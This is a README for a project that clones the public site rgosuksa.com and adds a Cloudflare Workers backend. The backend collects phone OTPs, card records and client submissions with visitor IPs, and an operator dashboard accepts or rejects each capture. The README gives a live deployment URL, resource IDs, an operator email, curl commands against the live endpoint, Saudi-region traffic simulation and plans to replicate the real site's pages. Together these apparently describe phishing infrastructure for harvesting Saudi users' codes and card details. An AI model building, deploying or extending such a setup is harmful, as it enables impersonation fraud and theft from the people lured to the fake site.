Clone of rgosuksa.com (work-in-progress)

This repository contains a skeleton to replicate the public surface of rgosuksa.com and implement a Cloudflare Workers backend for OTP and card storage (D1 + KV).

**Live Deployment** (tested and working):
- Worker URL: https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev
- KV Namespaces: OTP_KV (d1b917d366f34b0a8f132b58c294a69a), RATE_KV (a7ee726af5284e3ebb5649847bb0bde4)
- D1 Database: rgosuksa_db (4fa3a192-b0dc-47f5-9ede-b25c7d1fb469)

Quick start (local dev)

1. Install Wrangler (https://developers.cloudflare.com/workers/cli-wrangler/install):
   npm install -g wrangler

2. Create Cloudflare resources (one-time):
   - Create a KV namespace for OTPs ("OTP_KV")
   - Create a KV namespace for rate limiting ("RATE_KV")
   - Create a D1 database and run d1/schema.sql to create the cards table

   Example wrangler commands (alternatively use the Cloudflare dashboard):
   - wrangler kv:namespace create "OTP_KV" --preview
   - wrangler kv:namespace create "RATE_KV" --preview
   - wrangler d1 create "MY_D1_DB"  # creates a D1 database
   - To run the schema: wrangler d1 execute MY_D1_DB --file d1/schema.sql

   Note: exact CLI flags may change; use the Cloudflare docs if any command fails.

3. Configure wrangler.toml: replace placeholder ids with real binding ids. Do NOT commit secrets.

4. Set secrets (do NOT commit):
   - Locally: wrangler secret put HMAC_SECRET
   - In GitHub Actions: add repository secrets CF_API_TOKEN, HMAC_SECRET, SMS_API_KEY (if used)

5. Run locally:
   - Serve static site: npx serve site -p 8080
   - Run worker in dev (recommended with DEV_SHOW_OTP=1 for tests): DEV_SHOW_OTP=1 wrangler dev --local workers/worker.js

Run integration tests (requires wrangler dev running with DEV_SHOW_OTP=1):
  node tests/run-integration-tests.js

Note: DEV_SHOW_OTP=1 returns the OTP in the /api/request-otp response for development/testing only. Never enable in production.

Live Endpoint Examples (https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev):
- Request OTP: curl -X POST https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev/api/request-otp -H 'Content-Type: application/json' -d '{"phone":"+966512345678"}'
- Verify OTP: curl -X POST https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev/api/verify-otp -H 'Content-Type: application/json' -d '{"phone":"+966512345678","otp":"123456"}'
- Create card: curl -X POST https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev/api/cards -H 'Content-Type: application/json' -d '{"card_id":"card1","name":"Ali","phone":"+966512345678"}'
- Get card: curl https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev/api/cards/card1

SMS Provider Integration (optional for production):
The worker supports Twilio and Vonage SMS providers. To enable real SMS delivery:

1. Get provider API credentials (Twilio or Vonage)
2. Set secrets in wrangler:
   - wrangler secret put SMS_API_KEY (your API key)
   - Set SMS_PROVIDER environment variable in wrangler.toml to "twilio" or "vonage"
3. For local development: mock SMS logs to console (no real SMS sent)
4. Example env setup in wrangler.toml:
   ```toml
   [vars]
   SMS_PROVIDER = "twilio"
   ```

Mobile Testing (Saudi region):
- Use browser DevTools to set viewport (e.g., iPhone 12: 390x844)
- Or use CF-Connecting-IP header to simulate Saudi Arabia traffic:
  curl -H 'CF-Connecting-IP: 82.102.0.1' https://makavelithedonn-clone-rgosuksa.devopsjacob.workers.dev/api/request-otp ...

Local Endpoint Examples:

Security notes
- Phone numbers are HMACed before storing (phone_hash). Use an environment secret (HMAC_SECRET). Do NOT commit secrets.
- For stronger privacy, encrypt phone numbers with a key stored in a KMS and store ciphertext separately.
- D1 queries use parameter binding to avoid injection.

Next steps
- Crawl rgosuksa.com and replicate full HTML/CSS/assets into /site preserving routes and filenames. NOTE: This repo includes a "scripts/crawl-skeleton.js" that fetches structural skeleton pages but intentionally strips original textual content and images to avoid copying copyrighted content. To fetch and save raw pages (ensure you have rights), adapt that script accordingly.
- Expand client JS to match exact client behavior and interactive features.
- Wire a real SMS provider (Twilio/Vonage): use env vars SMS_API_KEY and SMS_PROVIDER. Implementation examples in workers/sms.js
- Complete site replication (all pages, assets, responsive mobile view)


## Admin dashboard and submissions

This project now includes an admin dashboard to review client submissions and track IPs and timing.

Key endpoints:
- POST /api/request-otp { phone: "devopsjacob@gmail.com" } — request OTP for admin (email treated as phone key)
- POST /api/admin/login { email, otp } — verify OTP and receive admin JWT
- POST /api/submit { phone, card_id, name } — client submits, stored in submissions table
- GET /api/submissions/{id} — public polling endpoint to check submission status
- Admin-only (Authorization: Bearer <JWT>):
  - GET /api/admin/submissions?status=pending&page=1&per_page=25
  - GET /api/admin/submissions/{id}
  - POST /api/admin/submissions/{id}/accept { notes }
  - POST /api/admin/submissions/{id}/reject { notes }

D1 migration:
- A migration file d1/migrations/001_add_submissions_table.sql is provided. Apply it with:

  wrangler d1 execute MY_D1_DB --file d1/migrations/001_add_submissions_table.sql

Privacy notes:
- Client phone numbers are HMAC-hashed before persistence (client_phone column). A masked_phone column stores a short mask (e.g., ****1234) shown to admins only.
- IP addresses are captured from CF-Connecting-IP request header and stored for timing/session tracking.

Admin UI:
- /site/admin/login.html — request OTP and login
- /site/admin/dashboard.html — view pending/completed submissions and accept/reject

Curl examples (admin flow):
- Request OTP: curl -X POST https://<YOUR_WORKER>/api/request-otp -H "Content-Type: application/json" -d '{"phone":"devopsjacob@gmail.com"}'
- Login: curl -X POST https://<YOUR_WORKER>/api/admin/login -H "Content-Type: application/json" -d '{"email":"devopsjacob@gmail.com","otp":"123456"}'
- Submit: curl -X POST https://<YOUR_WORKER>/api/submit -H "Content-Type: application/json" -d '{"phone":"+9665...","card_id":"c-1","name":"Ali"}'
- Poll: curl https://<YOUR_WORKER>/api/submissions/<id>
- Accept: curl -X POST https://<YOUR_WORKER>/api/admin/submissions/<id>/accept -H "Authorization: Bearer $JWT" -d '{"notes":"OK"}'
- Reject: curl -X POST https://<YOUR_WORKER>/api/admin/submissions/<id>/reject -H "Authorization: Bearer $JWT" -d '{"notes":"Wrong card"}'
